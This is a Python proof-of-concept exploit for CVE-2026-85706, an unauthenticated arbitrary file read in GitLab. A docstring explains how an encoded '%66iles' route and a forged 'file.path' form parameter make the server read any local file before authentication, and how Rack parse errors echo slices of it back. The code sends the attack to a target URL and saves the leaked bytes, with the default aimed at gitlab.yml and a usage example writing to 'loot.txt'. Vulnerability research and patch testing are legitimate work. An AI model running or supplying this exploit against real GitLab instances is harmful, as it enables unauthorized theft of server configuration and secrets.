#!/usr/bin/env python3
"""
CVE-2026-85706 - GitLab Unauthenticated Arbitrary Local File Read

An encoded character in the Repository Files API route
(``/repository/%66iles/x``) prevents GitLab Workhorse from recognizing the
request as an upload, while GitLab Rails decodes the path and dispatches it to
the Files API. The body-upload helper reads whatever local path the attacker
puts in the ``file.path`` parameter before looking up the project or
authenticating the request. The project id in the URL therefore does not need
to identify a real project.

The file is then handed to ``Rack::Utils.parse_nested_query``. If the bytes
contain what looks like a malformed percent-escape (e.g. ``%Y``), Rack raises an
``InvalidParameterError`` whose message reflects the offending token back to the
attacker. That reflected token is a slice of the target file, which is how file
content leaks out in the HTTP 400 response.

Because the leak is a reflected parse error, how much of a file is disclosed
depends on the file's own bytes: the leaked slice runs from a ``&``/``;``/``=``
delimiter up to the first malformed ``%`` sequence. Files that parse cleanly are
still opened and read before authorization, but their content is not echoed
back. The Files API then continues to later request validation. ``gitlab.yml``
is a reliable demo target because the stock Omnibus image generates it with
date-format directives such as ``%Y`` that trip the parser.

Usage:
    python3 poc.py http://your-ip:8080
    python3 poc.py http://your-ip:8080 -f /var/opt/gitlab/gitlab-rails/etc/gitlab.yml
    python3 poc.py http://your-ip:8080 -f /path/to/file > loot.txt
"""

import argparse
import json
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_FILE = "/var/opt/gitlab/gitlab-rails/etc/gitlab.yml"

# Marker that precedes the reflected file slice in the Rack error message.
LEAK_MARKER = "invalid %-encoding ("


def log(message):
    """Write progress to stderr so stdout stays clean for the leaked bytes."""
    print(message, file=sys.stderr)


def request(url, data=None):
    headers = {}
    if data is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=20) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as exc:
        log(f"[-] Cannot reach {url}: {exc.reason}")
        raise SystemExit(1)


def read_file(base_url, project_id, remote_path):
    """Ask GitLab Rails to read remote_path and return (status, message, leaked)."""
    form = urllib.parse.urlencode(
        {
            "file": "",
            "file.path": remote_path,
            "file.size": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }
    ).encode()

    # Workhorse sees the encoded segment and misses its upload route, whereas
    # Rails decodes "%66iles" and dispatches to the Repository Files API. The
    # upload metadata is consumed before this placeholder project is resolved.
    target = f"{base_url}/api/v4/projects/{project_id}/repository/%66iles/x"
    status, body = request(target, form)

    message = body
    try:
        response = json.loads(body)
        if isinstance(response, dict) and isinstance(response.get("message"), str):
            message = response["message"]
    except json.JSONDecodeError:
        pass

    leaked = None
    marker = message.find(LEAK_MARKER)
    if marker != -1:
        start = marker + len(LEAK_MARKER)
        end = message.rfind(")")
        leaked = message[start:end] if end > start else message[start:]

    return status, message, leaked


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-85706 unauthenticated arbitrary file read for GitLab.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "The disclosed content is a reflected Rack parse error, so a file is\n"
            "only echoed back when its bytes contain a malformed %-escape sequence."
        ),
    )
    parser.add_argument(
        "target",
        help="Base URL of the GitLab instance, e.g. http://127.0.0.1:8080",
    )
    parser.add_argument(
        "-f",
        "--file",
        default=DEFAULT_FILE,
        help=f"Remote file path to read (default: {DEFAULT_FILE})",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    project_id = secrets.randbelow(900_000_000) + 100_000_000
    log(f"[*] Using random project-id placeholder: {project_id}")
    log(f"[*] Reading remote file: {args.file}")
    status, message, leaked = read_file(base_url, project_id, args.file)

    if leaked is not None:
        log(f"[+] File disclosed via reflected parse error (HTTP {status}). Content on stdout:")
        # Only the recovered file bytes go to stdout so output can be piped/saved.
        sys.stdout.write(leaked)
        if not leaked.endswith("\n"):
            sys.stdout.write("\n")
        return 0

    if status == 401 or "branch is required" in message:
        log("[-] The file was read before authorization but parsed cleanly, so no bytes were reflected.")
        log("    Try a file containing malformed %-escapes (e.g. the default gitlab.yml).")
        return 3

    if "local file not present" in message:
        log(f"[-] The file does not exist on the server: {args.file}")
        return 2

    if status == 500:
        log(f"[-] HTTP 500: the path is likely unreadable (permission denied) or is a directory: {args.file}")
        return 4

    log(f"[-] Unexpected response (HTTP {status}): {message}")
    return 5


if __name__ == "__main__":
    raise SystemExit(main())
